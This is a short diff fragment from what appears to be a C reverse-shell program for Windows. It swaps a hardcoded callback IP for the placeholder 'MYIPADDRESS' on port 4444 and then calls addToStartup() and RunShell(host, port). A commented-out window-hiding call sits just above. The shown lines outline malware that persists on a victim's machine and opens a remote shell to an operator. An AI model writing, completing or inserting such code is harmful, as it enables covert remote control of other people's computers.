@@ -225,7 +225,7 @@ int main() {
     ShowWindow(window, 0);
     */
     
-    char host[] = "192.168.178.102";  
+    char host[] = "MYIPADDRESS";  
     int port = 4444;    
     addToStartup();
     RunShell(host, port);
